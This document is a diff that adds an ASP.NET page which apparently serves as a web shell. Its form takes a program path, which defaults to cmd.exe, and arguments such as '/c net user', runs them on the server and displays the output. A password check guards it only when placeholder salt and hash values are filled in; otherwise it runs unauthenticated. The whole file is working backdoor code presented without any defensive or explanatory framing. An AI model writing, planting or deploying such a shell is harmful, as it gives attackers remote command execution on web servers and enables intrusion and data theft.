@@ -1,0 +1,81 @@
+<%@ Page Language="C#" Debug="false" %>
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+<%@ Import Namespace="System.Text" %>
+
+<script runat="server">
+
+private string ComputeHashWithSalt(string password, string salt)
+{
+    using (SHA256 sha256 = SHA256.Create())
+    {
+        byte[] bytes = Encoding.UTF8.GetBytes(password + salt);
+        byte[] hashBytes = sha256.ComputeHash(bytes);
+        return Convert.ToBase64String(hashBytes);
+    }
+}
+
+protected void Page_Load(object sender, EventArgs e)
+{
+    string storedSalt = "__SALT__";
+    bool authRequired = (storedSalt != "__"+"SALT"+"__");
+    xsec.Visible = authRequired;
+    L_s.Visible = authRequired;
+}
+
+protected void RunCmd(object sender, EventArgs e)
+{
+    string providedPassword = xsec.Text;
+    string storedSalt = "__SALT__";
+    string storedHash = "__HASH__";
+    
+    bool authRequired = (storedSalt != "__"+"SALT"+"__");
+    
+    if (!authRequired || ComputeHashWithSalt(providedPassword, storedSalt) == storedHash)
+    {
+        Process myProcess = new Process();
+        ProcessStartInfo myProcessStartInfo = new ProcessStartInfo(xpath.Text)
+        {
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            Arguments = xcmd.Text
+        };
+        
+        myProcess.StartInfo = myProcessStartInfo;
+        myProcess.Start();
+        
+        StreamReader myStreamReader = myProcess.StandardOutput;
+        string myString = myStreamReader.ReadToEnd();
+        myProcess.Close();
+        
+        myString = myString.Replace("<", "&lt;").Replace(">", "&gt;");
+        result.Text = "<pre>" + myString + "</pre>";
+    }
+    else
+    {
+        result.Text = "Invalid credentials.";
+    }
+}
+
+</script>
+
+<html>
+<body>
+<form runat="server">
+    <p><asp:Label ID="L_p" runat="server" Width="80px">Program</asp:Label>
+    <asp:TextBox ID="xpath" runat="server" Width="300px">C:\\Windows\\System32\\cmd.exe</asp:TextBox>
+    
+    <p><asp:Label ID="L_a" runat="server" Width="80px">Arguments</asp:Label>
+    <asp:TextBox ID="xcmd" runat="server" Width="300px" Text="/c net user"></asp:TextBox>
+    
+    <p><asp:Button ID="Button" OnClick="RunCmd" runat="server" Width="100px" Text="Run"></asp:Button>
+    
+    <p><asp:Label ID="L_s" runat="server" Width="80px" Visible="false">Secret</asp:Label>
+    <asp:TextBox ID="xsec" runat="server" Width="300px" Visible="false"></asp:TextBox>
+    
+    <p><asp:Label ID="result" runat="server"></asp:Label>
+</form>
+</body>
+</html>
